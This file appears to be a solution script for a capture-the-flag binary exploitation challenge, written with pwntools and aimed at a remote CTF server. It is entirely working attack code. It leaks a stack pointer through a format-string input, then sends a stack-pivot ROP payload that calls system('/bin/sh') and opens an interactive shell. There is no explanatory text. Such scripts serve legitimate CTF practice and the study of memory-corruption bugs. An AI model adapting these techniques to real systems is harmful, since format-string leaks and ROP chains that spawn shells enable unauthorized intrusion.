from pwn import *
from LibcSearcher import *
#context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn','''
#            b main
#            b *0x4007E8
#            ''')
#io=process('./pwn')
io=remote('node4.anna.nssctf.cn',28995)
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive

elf=ELF('./pwn')


ru(b'name: ')

leave=0x00000000004007F2
ret=0x00000000004005b9 #: ret
rdi=0x00000000004008d3 #: pop rdi ; ret
system=elf.plt['system']

sl(b'%16$p')


ru(b'hello,')

ru(b'0x')
rbp= int(io.recv(12).rjust(16,b'0'),16)
print(hex(rbp))

ru(b'keep on !')
p2=b'this rbp'+p64(rdi)+p64(rbp-0x30)+p64(ret)+p64(system)+b'this bin'+b'/bin/sh\x00'
p2=p2.ljust(0x60-8-8,b'a')+p64(rbp-0x60)+p64(leave)

sl(p2)



ii()
